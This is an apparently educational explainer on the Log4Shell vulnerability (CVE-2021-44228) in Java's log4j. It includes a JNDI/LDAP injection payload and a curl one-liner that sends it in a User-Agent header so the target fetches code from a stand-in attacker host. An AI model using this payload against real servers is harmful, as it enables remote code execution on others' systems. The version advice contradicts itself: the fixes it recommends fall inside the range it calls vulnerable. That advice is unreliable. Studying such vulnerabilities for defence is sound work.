CVE-2021-44228 (Log4Shell)


Summary:
CVE-2021-44228, otherwise known as Log4Shell, is a RCE vulnerability in Java’s log4j library, the most popular logging library in Java. Foundationally, the vulnerability lies in the library’s allowance of JNDI, which can be used to fetch malicious files within the Java application.


How the vulnerability works:
This is an example of a payload that can be used to trigger the Log4Shell vulnerability.
${JNDI:LDAP://evilserver.com/a}
- In Java, ${} is used as a placeholder that will be supplied with the output string at runtime. “${env:hostname}” for example, tells Java to find the environment variable called ‘hostname’ and get its value.
- The Java Naming and Directory Interface, shortened to JNDI, is a centralized query system used to call out for resources that the Java application can use. Python for example uses different modules such as requests, urllib, or ldap3 to interact with protocols, Java uses JNDI. It provides a bridge for Java to access necessary resources, such as a file, database or configuration.
- In this example, the attacker uses LDAP to deliver the payload, however other services like HTTP can also be used.
- evilserver.com/a will deliver the payload to the victim once it’s connected.

The Log4Shell exploit can be triggered by any input that passes through the vulnerable log4j library. The most common use case and perhaps the simplest method is to inject it into the User-Agent header, which means it can be run from a terminal on a single line using the following command (on Linux).
curl https://vulnerable.server.com/ -H “User-Agent: ${JNDI:LDAP://evilserver.com/a}”
If the User-Agent is logged, it will be executed. 


What is vulnerable:
Applications that use log4j 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable according to the Apache Software Foundation.
Log4j 1.x will not be vulnerable to this specific CVE, but it has reached end of life in 2015 and should be retired regardless.


Mitigation:
The Apache Software Foundation recommends to “Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).” for any application that could be vulnerable
